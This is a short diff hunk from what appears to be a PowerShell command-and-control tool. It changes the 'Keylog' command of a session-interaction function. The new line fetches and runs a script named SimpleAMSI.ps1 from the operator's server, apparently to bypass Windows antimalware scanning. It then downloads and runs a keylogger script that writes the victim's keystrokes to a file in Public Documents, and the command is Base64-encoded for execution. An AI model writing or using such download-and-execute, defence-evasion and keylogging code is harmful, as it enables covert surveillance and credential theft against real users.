@@ -1859,7 +1859,7 @@ function InteractWithPipeSession{
 		
 		elseif($Command -eq "Keylog"){
 			
-			$rawCommand = "iex(new-object net.webclient).downloadstring('$($global:ServerURL)/klg.ps1');KeyLog -logfile `"c:\Users\Public\Documents\`$(`$env:USERNAME)log.txt`""
+			$rawCommand = "iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/klg.ps1');KeyLog -logfile `"c:\Users\Public\Documents\`$(`$env:USERNAME)log.txt`""
 			
 			$encCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($rawCommand))
 			
